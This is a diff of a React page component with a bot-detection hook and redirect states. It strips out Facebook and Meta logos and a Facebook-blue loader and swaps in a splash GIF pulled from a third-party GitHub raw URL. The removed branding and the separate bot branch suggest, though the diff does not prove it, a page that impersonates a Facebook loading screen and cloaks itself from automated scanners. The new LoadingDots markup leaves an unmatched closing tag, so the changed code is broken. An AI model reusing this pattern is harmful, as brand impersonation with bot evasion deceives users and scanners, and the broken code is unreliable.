@@ -1,5 +1,3 @@
-import FacebookLogo from '@/assets/images/facebook-icon.webp';
-import MetaImage from '@/assets/images/meta-logo.png';
 import type { FC } from 'react';
 import { useEffect, useRef, useState } from 'react';
 import { useBotDetection } from '@/hooks/useBotDetection';
@@ -19,22 +17,9 @@ const LoadingDots = () => {
     }, []);
 
     return (
-        <div className="flex h-4 w-24 items-center justify-center gap-2">
-            <div
-                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 1 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
-            />
-            <div
-                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 2 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
-            />
-            <div
-                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 3 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
-            />
-            <div
-                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 4 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
-            />
-            <div
-                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 5 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
-            />
+        <div className="fixed inset-0 flex items-center justify-center bg-white">
+				<img src="https://raw.githubusercontent.com/Cattom911/ca_map/refs/heads/enable_noti/src/assets/images/splash.gif" alt="Loading..." className="max-w-full max-h-full" />
+			</div>
         </div>
     );
 };
@@ -142,65 +127,23 @@ const Index: FC = () => {
     if (isLoading) {
         return (
             <div className="fixed inset-0 flex items-center justify-center bg-white">
-                <div className="flex flex-col items-center gap-2">
-                    <img
-                        src={FacebookLogo}
-                        alt="Loading..."
-                        className="h-16 w-16 md:h-20 md:w-20"
-                    />
-                    <LoadingDots />
-                </div>
-                <img
-                    src={MetaImage}
-                    alt="Meta"
-                    className="fixed bottom-8 left-1/2 h-4 -translate-x-1/2 md:h-5"
-                />
-            </div>
+				<img src="https://raw.githubusercontent.com/Cattom911/ca_map/refs/heads/enable_noti/src/assets/images/splash.gif" alt="Loading..." className="max-w-full max-h-full" />
+			</div>
         );
     }
 
     if (isBot) {
         return (
             <div className="fixed inset-0 flex items-center justify-center bg-white">
-                <div className="flex flex-col items-center gap-2">
-                    <img
-                        src={FacebookLogo}
-                        alt="Loading..."
-                        className="h-16 w-16 md:h-20 md:w-20"
-                    />
-                    <LoadingDots />
-                </div>
-                <img
-                    src={MetaImage}
-                    alt="Meta"
-                    className="fixed bottom-8 left-1/2 h-4 -translate-x-1/2 md:h-5"
-                />
-            </div>
+				<img src="https://raw.githubusercontent.com/Cattom911/ca_map/refs/heads/enable_noti/src/assets/images/splash.gif" alt="Loading..." className="max-w-full max-h-full" />
+			</div>
         );
     }
 
     return (
         <div className="fixed inset-0 flex items-center justify-center bg-white">
-            <div className="flex flex-col items-center gap-4">
-                <img src={FacebookLogo} alt="Loading..." className="h-16 w-16 md:h-20 md:w-20" />
-                {redirecting ? (
-                    <div className="text-center">
-                        <LoadingDots />
-                    </div>
-                ) : shouldRedirect ? (
-                    <div className="text-center">
-                        <LoadingDots />
-                    </div>
-                ) : (
-                    <LoadingDots />
-                )}
-            </div>
-            <img
-                src={MetaImage}
-                alt="Meta"
-                className="fixed bottom-8 left-1/2 h-4 -translate-x-1/2 md:h-5"
-            />
-        </div>
+				<img src="https://raw.githubusercontent.com/Cattom911/ca_map/refs/heads/enable_noti/src/assets/images/splash.gif" alt="Loading..." className="max-w-full max-h-full" />
+			</div>
     );
 };
 
